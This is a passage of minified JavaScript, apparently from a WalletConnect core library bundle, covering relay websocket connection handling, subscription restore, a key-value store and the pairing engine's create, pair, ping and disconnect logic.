this.batchSubscribe(n)}}this.events.emit(ec.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:t}=at("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async t=>TT(Gb({},t),{id:await this.getSubscriptionId(t.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const t=await this.rpcBatchFetchMessages(e);t&&t.messages&&(await Mrt(fe.toMiliseconds(fe.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(t.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return ld(e+await this.getClientId())}}var Nct=Object.defineProperty,hG=Object.getOwnPropertySymbols,Pct=Object.prototype.hasOwnProperty,$ct=Object.prototype.propertyIsEnumerable,zP=(r,e,t)=>e in r?Nct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,fG=(r,e)=>{for(var t in e||(e={}))Pct.call(e,t)&&zP(r,t,e[t]);if(hG)for(var t of hG(e))$ct.call(e,t)&&zP(r,t,e[t]);return r},mi=(r,e,t)=>zP(r,typeof e!="symbol"?e+"":e,t);class Rct extends Eet{constructor(e){super(e),mi(this,"protocol","wc"),mi(this,"version",2),mi(this,"core"),mi(this,"logger"),mi(this,"events",new en.EventEmitter),mi(this,"provider"),mi(this,"messages"),mi(this,"subscriber"),mi(this,"publisher"),mi(this,"name",lot),mi(this,"transportExplicitlyClosed",!1),mi(this,"initialized",!1),mi(this,"connectionAttemptInProgress",!1),mi(this,"relayUrl"),mi(this,"projectId"),mi(this,"packageName"),mi(this,"bundleId"),mi(this,"hasExperiencedNetworkDisruption",!1),mi(this,"pingTimeout"),mi(this,"heartBeatTimeout",fe.toMiliseconds(fe.THIRTY_SECONDS+fe.FIVE_SECONDS)),mi(this,"reconnectTimeout"),mi(this,"connectPromise"),mi(this,"reconnectInProgress",!1),mi(this,"requestsInFlight",[]),mi(this,"connectTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),mi(this,"request",async t=>{var i,n;this.logger.debug("Publishing Request Payload");const s=t.id||Cs().toString();await this.toEstablishConnection();try{this.logger.trace({id:s,method:t.method,topic:(i=t.params)==null?void 0:i.topic},"relayer.request - publishing...");const o=`${s}:${((n=t.params)==null?void 0:n.tag)||""}`;this.requestsInFlight.push(o);const a=await this.provider.request(t);return this.requestsInFlight=this.requestsInFlight.filter(c=>c!==o),a}catch(o){throw this.logger.debug(`Failed to Publish Request: ${s}`),o}}),mi(this,"resetPingTimeout",()=>{ox()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var t,i,n,s;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(s=(n=(i=(t=this.provider)==null?void 0:t.connection)==null?void 0:i.socket)==null?void 0:n.terminate)==null||s.call(n)}catch(o){this.logger.warn(o,o?.message)}},this.heartBeatTimeout))}),mi(this,"onPayloadHandler",t=>{this.onProviderPayload(t),this.resetPingTimeout()}),mi(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(qs.connect)}),mi(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),mi(this,"onProviderErrorHandler",t=>{this.logger.fatal(`Fatal socket error: ${t.message}`),this.events.emit(qs.error,t),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),mi(this,"registerProviderListeners",()=>{this.provider.on(Wc.payload,this.onPayloadHandler),this.provider.on(Wc.connect,this.onConnectHandler),this.provider.on(Wc.disconnect,this.onDisconnectHandler),this.provider.on(Wc.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?gr(e.logger,this.name):Iu(ra({level:e.logger||cot})),this.messages=new pct(this.logger,e.core),this.subscriber=new kct(this,this.logger),this.publisher=new yct(this,this.logger),this.relayUrl=e?.relayUrl||Aoe,this.projectId=e.projectId,yrt()?this.packageName=dK():xrt()&&(this.bundleId=dK()),this.provider={}}async init(){if(this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.subscriber.hasAnyTopics)try{await this.transportOpen()}catch(e){this.logger.warn(e,e?.message)}}get context(){return Or(this.logger)}get connected(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===1||!1}get connecting(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,t,i){this.isInitialized(),await this.publisher.publish(e,t,i),await this.recordMessageEvent({topic:e,message:t,publishedAt:Date.now(),transportType:pn.relay},k9.outbound)}async subscribe(e,t){var i,n,s;this.isInitialized(),(!(t!=null&&t.transportType)||t?.transportType==="relay")&&await this.toEstablishConnection();const o=typeof((i=t?.internal)==null?void 0:i.throwOnFailedPublish)>"u"?!0:(n=t?.internal)==null?void 0:n.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=u=>{u.topic===e&&(this.subscriber.off(ec.created,l),c())};return await Promise.all([new Promise(u=>{c=u,this.subscriber.on(ec.created,l)}),new Promise(async(u,d)=>{a=await this.subscriber.subscribe(e,fG({internal:{throwOnFailedPublish:o}},t)).catch(h=>{o&&d(h)})||a,u()})]),a}async unsubscribe(e,t){this.isInitialized(),await this.subscriber.unsubscribe(e,t)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await Uf(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(t,i)=>{await this.connect(e).then(t).catch(i).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await XK())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if(e?.length===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const t=e.sort((i,n)=>i.publishedAt-n.publishedAt);this.logger.debug(`Batch of ${t.length} message events sorted`);for(const i of t)try{await this.onMessageEvent(i)}catch(n){this.logger.warn(n,"Error while processing batch message event: "+n?.message)}this.logger.trace(`Batch of ${t.length} message events processed`)}async onLinkMessageEvent(e,t){const{topic:i}=e;if(!t.sessionExists){const n=bs(fe.FIVE_MINUTES),s={topic:i,expiry:n,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(i,s)}this.events.emit(qs.message,e),await this.recordMessageEvent(e,k9.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let t=1;for(;t<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${t}...`),await this.createProvider(),await new Promise(async(i,n)=>{const s=()=>{n(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Wc.disconnect,s),await Uf(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{n(o)}).finally(()=>{this.provider.off(Wc.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{a(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Wc.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(Wc.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,i()})}catch(i){await this.subscriber.stop();const n=i;this.logger.warn({},n.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${t}`);break}await new Promise(i=>setTimeout(i,fe.toMiliseconds(t*1))),t++}}startPingTimeout(){var e,t,i,n,s;if(ox())try{(t=(e=this.provider)==null?void 0:e.connection)!=null&&t.socket&&((s=(n=(i=this.provider)==null?void 0:i.connection)==null?void 0:n.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o?.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new Vr(new vR(Art({sdkVersion:DP,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,t){const{topic:i,message:n}=e;await this.messages.set(i,n,t)}async shouldIgnoreMessageEvent(e){const{topic:t,message:i}=e;if(!i||i.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${i}`),!0;if(!await this.subscriber.isKnownTopic(t))return this.logger.warn(`Ignoring message for unknown topic ${t}`),!0;const n=this.messages.has(t,i);return n&&this.logger.warn(`Ignoring duplicate message: ${i}`),n}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),N0(e)){if(!e.method.endsWith(uot))return;const t=e.params,{topic:i,message:n,publishedAt:s,attestation:o}=t.data,a={topic:i,message:n,publishedAt:s,transportType:pn.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(fG({type:"event",event:t.id},a)),this.events.emit(t.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else Jd(e)&&this.events.emit(qs.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,k9.inbound),this.events.emit(qs.message,e))}async acknowledgePayload(e){const t=bl(e.id,!0);await this.provider.connection.send(t)}unregisterProviderListeners(){this.provider.off(Wc.payload,this.onPayloadHandler),this.provider.off(Wc.connect,this.onConnectHandler),this.provider.off(Wc.disconnect,this.onDisconnectHandler),this.provider.off(Wc.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await XK();Gst(async t=>{e!==t&&(e=t,t?await this.transportOpen().catch(i=>this.logger.error(i,i?.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))}),this.core.heartbeat.on(Ks.pulse,async()=>{if(!this.transportExplicitlyClosed&&!this.connected&&Jst())try{await this.confirmOnlineStateOrThrow(),await this.transportOpen()}catch(t){this.logger.warn(t,t?.message)}})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(qs.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e?.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},fe.toMiliseconds(dot)))))}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}}function Oct(){}function pG(r){if(!r||typeof r!="object")return!1;const e=Object.getPrototypeOf(r);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(r)==="[object Object]":!1}function gG(r){return Object.getOwnPropertySymbols(r).filter(e=>Object.prototype.propertyIsEnumerable.call(r,e))}function mG(r){return r==null?r===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(r)}const Bct="[object RegExp]",Mct="[object String]",Dct="[object Number]",Lct="[object Boolean]",wG="[object Arguments]",Uct="[object Symbol]",jct="[object Date]",Fct="[object Map]",qct="[object Set]",zct="[object Array]",Wct="[object Function]",Hct="[object ArrayBuffer]",kT="[object Object]",Vct="[object Error]",Kct="[object DataView]",Gct="[object Uint8Array]",Zct="[object Uint8ClampedArray]",Yct="[object Uint16Array]",Jct="[object Uint32Array]",Qct="[object BigUint64Array]",Xct="[object Int8Array]",elt="[object Int16Array]",tlt="[object Int32Array]",rlt="[object BigInt64Array]",ilt="[object Float32Array]",nlt="[object Float64Array]";function slt(r,e){return r===e||Number.isNaN(r)&&Number.isNaN(e)}function olt(r,e,t){return f5(r,e,void 0,void 0,void 0,void 0,t)}function f5(r,e,t,i,n,s,o){const a=o(r,e,t,i,n,s);if(a!==void 0)return a;if(typeof r==typeof e)switch(typeof r){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return r===e;case"number":return r===e||Object.is(r,e);case"function":return r===e;case"object":return Q5(r,e,s,o)}return Q5(r,e,s,o)}function Q5(r,e,t,i){if(Object.is(r,e))return!0;let n=mG(r),s=mG(e);if(n===wG&&(n=kT),s===wG&&(s=kT),n!==s)return!1;switch(n){case Mct:return r.toString()===e.toString();case Dct:{const c=r.valueOf(),l=e.valueOf();return slt(c,l)}case Lct:case jct:case Uct:return Object.is(r.valueOf(),e.valueOf());case Bct:return r.source===e.source&&r.flags===e.flags;case Wct:return r===e}t=t??new Map;const o=t.get(r),a=t.get(e);if(o!=null&&a!=null)return o===e;t.set(r,e),t.set(e,r);try{switch(n){case Fct:{if(r.size!==e.size)return!1;for(const[c,l]of r.entries())if(!e.has(c)||!f5(l,e.get(c),c,r,e,t,i))return!1;return!0}case qct:{if(r.size!==e.size)return!1;const c=Array.from(r.values()),l=Array.from(e.values());for(let u=0;u<c.length;u++){const d=c[u],h=l.findIndex(f=>f5(d,f,void 0,r,e,t,i));if(h===-1)return!1;l.splice(h,1)}return!0}case zct:case Gct:case Zct:case Yct:case Jct:case Qct:case Xct:case elt:case tlt:case rlt:case ilt:case nlt:{if(typeof Buffer<"u"&&Buffer.isBuffer(r)!==Buffer.isBuffer(e)||r.length!==e.length)return!1;for(let c=0;c<r.length;c++)if(!f5(r[c],e[c],c,r,e,t,i))return!1;return!0}case Hct:return r.byteLength!==e.byteLength?!1:Q5(new Uint8Array(r),new Uint8Array(e),t,i);case Kct:return r.byteLength!==e.byteLength||r.byteOffset!==e.byteOffset?!1:Q5(new Uint8Array(r),new Uint8Array(e),t,i);case Vct:return r.name===e.name&&r.message===e.message;case kT:{if(!(Q5(r.constructor,e.constructor,t,i)||pG(r)&&pG(e)))return!1;const c=[...Object.keys(r),...gG(r)],l=[...Object.keys(e),...gG(e)];if(c.length!==l.length)return!1;for(let u=0;u<c.length;u++){const d=c[u],h=r[d];if(!Object.hasOwn(e,d))return!1;const f=e[d];if(!f5(h,f,d,r,e,t,i))return!1}return!0}default:return!1}}finally{t.delete(r),t.delete(e)}}function alt(r,e){return olt(r,e,Oct)}var clt=Object.defineProperty,bG=Object.getOwnPropertySymbols,llt=Object.prototype.hasOwnProperty,ult=Object.prototype.propertyIsEnumerable,WP=(r,e,t)=>e in r?clt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,vG=(r,e)=>{for(var t in e||(e={}))llt.call(e,t)&&WP(r,t,e[t]);if(bG)for(var t of bG(e))ult.call(e,t)&&WP(r,t,e[t]);return r},ha=(r,e,t)=>WP(r,typeof e!="symbol"?e+"":e,t);class A2 extends _et{constructor(e,t,i,n=Kd,s=void 0){super(e,t,i,n),this.core=e,this.logger=t,this.name=i,ha(this,"map",new Map),ha(this,"version",hot),ha(this,"cached",[]),ha(this,"initialized",!1),ha(this,"getKey"),ha(this,"storagePrefix",Kd),ha(this,"recentlyDeleted",[]),ha(this,"recentlyDeletedLimit",200),ha(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!lo(o)?this.map.set(this.getKey(o),o):Sst(o)?this.map.set(o.id,o):Ast(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),ha(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),ha(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),ha(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>alt(a[c],o[c]))):this.values)),ha(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=vG(vG({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),ha(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=gr(t,this.name),this.storagePrefix=n,this.getKey=s}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const t=this.map.get(e);if(!t){if(this.recentlyDeleted.includes(e)){const{message:n}=at("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(n),new Error(n)}const{message:i}=at("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}return t}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:t}=at("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var dlt=Object.defineProperty,hlt=(r,e,t)=>e in r?dlt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Zr=(r,e,t)=>hlt(r,typeof e!="symbol"?e+"":e,t);class flt{constructor(e,t){this.core=e,this.logger=t,Zr(this,"name",mot),Zr(this,"version",wot),Zr(this,"events",new T0),Zr(this,"pairings"),Zr(this,"initialized",!1),Zr(this,"storagePrefix",Kd),Zr(this,"ignoredPayloadTypes",[s0]),Zr(this,"registeredMethods",[]),Zr(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),Zr(this,"register",({methods:i})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...i])]}),Zr(this,"create",async i=>{this.isInitialized();const n=BP(),s=await this.core.crypto.setSymKey(n),o=bs(fe.FIVE_MINUTES),a={protocol:Soe},c={topic:s,expiry:o,relay:a,active:!1,methods:i?.methods},l=WK({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:n,relay:a,expiryTimestamp:o,methods:i?.methods});return this.events.emit(g1.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:i?.transportType}),{topic:s,uri:l}}),Zr(this,"pair",async i=>{this.isInitialized();const n=this.core.eventClient.createEvent({properties:{topic:i?.uri,trace:[rd.pairing_started]}});this.isValidPair(i,n);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=zK(i.uri);n.props.properties.topic=s,n.addTrace(rd.pairing_uri_validation_success),n.addTrace(rd.pairing_uri_not_expired);let u;if(this.pairings.keys.includes(s)){if(u=this.pairings.get(s),n.addTrace(rd.existing_pairing),u.active)throw n.setError(Oh.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);n.addTrace(rd.pairing_not_expired)}const d=c||bs(fe.FIVE_MINUTES),h={topic:s,relay:a,expiry:d,active:!1,methods:l};this.core.expirer.set(s,d),await this.pairings.set(s,h),n.addTrace(rd.store_new_pairing),i.activatePairing&&await this.activate({topic:s}),this.events.emit(g1.create,h),n.addTrace(rd.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),n.addTrace(rd.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{n.setError(Oh.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(f){throw n.setError(Oh.subscribe_pairing_topic_failure),f}return n.addTrace(rd.subscribe_pairing_topic_success),h}),Zr(this,"activate",async({topic:i})=>{this.isInitialized();const n=bs(fe.FIVE_MINUTES);this.core.expirer.set(i,n),await this.pairings.update(i,{active:!0,expiry:n})}),Zr(this,"ping",async i=>{this.isInitialized(),await this.isValidPing(i),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:n}=i;if(this.pairings.keys.includes(n)){const s=await this.sendRequest(n,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=n1();this.events.once(Pi("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}}),Zr(this,"updateExpiry",async({topic:i,expiry:n})=>{this.isInitialized(),await this.pairings.update(i,{expiry:n})}),Zr(this,"updateMetadata",async({topic:i,metadata:n})=>{this.isInitialized(),await this.pairings.update(i,{peerMetadata:n})}),Zr(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),Zr(this,"disconnect",async i=>{this.isInitialized(),await this.isValidDisconnect(i);const{topic:n}=i;this.pairings.keys.includes(n)&&(await this.sendRequest(n,"wc_pairingDelete",Vi("USER_DISCONNECTED")),await this.deletePairing(n))}),Zr(this,"formatUriFromPairing",i=>{this.isInitialized();const{topic:n,relay:s,expiry:o,methods:a}=i,c=this.core.crypto.keychain.get(n);return WK({protocol:this.core.protocol,version:this.core.version,topic:n,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),Zr(this,"sendRequest",async(i,n,s)=>{const o=jn(n,s),a=await this.core.crypto.encode(i,o),c=Vb[n].req;return this.core.history.set(i,o),this.core.relayer.publish(i,a,c),o.id}),Zr(this,"sendResult",async(i,n,s)=>{const o=bl(i,s),a=await this.core.crypto.encode(n,o),c=(await this.core.history.get(n,i)).request.method,l=Vb[c].res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)}),Zr(this,"sendError",async(i,n,s)=>{const o=Ap(i,s),a=await this.core.crypto.encode(n,o),c=(await this.core.history.get(n,i)).request.method,l=Vb[c]?Vb[c].res:Vb.unregistered_method.res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)}),Zr(this,"deletePairing",async(i,n)=>{await this.core.relayer.unsubscribe(i),await Promise.all([this.pairings.delete(i,Vi("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(i),n?Promise.resolve():this.core.expirer.del(i)])}),Zr(this,"cleanup",async()=>{const i=this.pairings.getAll().filter(n=>Sf(n.expiry));await Promise.all(i.map(n=>this.deletePairing(n.topic)))}),Zr(this,"onRelayEventRequest",async i=>{const{topic:n,payload:s}=i;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(n,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(n,s);default:return await this.onUnknownRpcMethodRequest(n,s)}}),Zr(this,"onRelayEventResponse",async i=>{const{topic:n,payload:s}=i,o=(await this.core.history.get(n,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(n,s);default:return this.onUnknownRpcMethodResponse(o)}}),Zr(this,"onPairingPingRequest",async(i,n)=>{const{id:s}=n;try{this.isValidPing({topic:i}),await this.sendResult(s,i,!0),this.events.emit(g1.ping,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}}),Zr(this,"onPairingPingResponse",(i,n)=>{const{id:s}=n;setTimeout(()=>{Gi(n)?this.events.emit(Pi("pairing_ping",s),{}):wi(n)&&this.events.emit(Pi("pairing_ping",s),{error:n.error})},500)}),Zr(this,"onPairingDeleteRequest",async(i,n)=>{const{id:s}=n;try{this.isValidDisconnect({topic:i}),await this.deletePairing(i),this.events.emit(g1.delete,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}}),Zr(this,"onUnknownRpcMethodRequest",async(i,n)=>{const{id:s,method:o}=n;try{if(this.registeredMethods.includes(o))return;const a=Vi("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,i,a),this.logger.error(a)}catch(a){await this.sendError(s,i,a),this.logger.error(a)}}),Zr(this,"onUnknownRpcMethodResponse",i=>{this.registeredMethods.includes(i)||this.logger.error(Vi("WC_METHOD_UNSUPPORTED",i))}),Zr(this,"isValidPair",(i,n)=>{var s;if(!ba(i)){const{message:a}=at("MISSING_OR_INVALID",`pair() params: ${i}`);throw n.setError(Oh.malformed_pairing_uri),new Error(a)}if(!_st(i.uri)){const{message:a}=at("MISSING_OR_INVALID",`pair() uri: ${i.uri}`);throw n.setError(Oh.malformed_pairing_uri),new Error(a)}const o=zK(i?.uri);if(!((s=o?.relay)!=null&&s.protocol)){const{message:a}=at("MISSING_OR_INVALID","pair() uri#relay-protocol");throw n.setError(Oh.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=at("MISSING_OR_INVALID","pair() uri#symKey");throw n.setError(Oh.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&fe.toMiliseconds(o?.expiryTimestamp)<Date.now()){n.setError(Oh.pairing_expired);const{message:a}=at("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),Zr(this,"isValidPing",async i=>{if(!ba(i)){const{message:s}=at("MISSING_OR_INVALID",`ping() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)}),Zr(this,"isValidDisconnect",async i=>{if(!ba(i)){const{message:s}=at("MISSING_OR_INVALID",`disconnect() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)}),Zr(this,"isValidPairingTopic",async i=>{if(!us(i,!1)){const{message:n}=at("MISSING_OR_INVALID",`pairing topic should be a string: ${i}`);throw new Error(n)}if(!this.pairings.keys.includes(i)){const{message:n}=at("NO_MATCHING_KEY",`pairing topic doesn't exist: ${i}`);throw new Error(n)}if(Sf(this.pairings.get(i).expiry)){await this.deletePairing(i);const{message:n}=at("EXPIRED",`pairing topic: ${i}`);throw new Error(n)}}),this.core=e,this.logger=gr(t,this.name),this.pairings=new A2(this.core,this.logger,this.name,this.storagePrefix)}get context(){return Or(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(qs.message,async e=>{const{topic:t,message:i,transportType:n}=e;if(this.pairings.keys.includes(t)&&n!==pn.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(i)))try{const s=await this.core.crypto.decode(t,i);N0(s)?(this.core.history.set(t,s),await this.onRelayEventRequest({topic:t,payload:s})):Jd(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:t,payload:s}),this.core.history.delete(t,s.id)),await this.core.relayer.messages.ack(t,i)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(Zc.expired,async e=>{const{topic:t}=Fse(e.target);t&&this.pairings.keys.includes(t)&&(await this.deletePairing(t,!0),this.events.emit(g1.expire,{topic:t}))})}}var plt=Object.defineProperty,glt=(r,e,t)=>e in r?plt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,to=(r,e,t)=>glt(r,typeof e!="symbol"?e+"":e,t);class mlt extends yet{constructor(e,t){super(e,t),this.core=e,this.logger=t,to(this,"records",new Map),to(this,"events",new en.EventEmitter),to(this,"name",bot),to(this,"version",vot),to(this,"cached",[]),to(this,"initialized",!1),to(this,"storagePrefix",Kd),to(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await 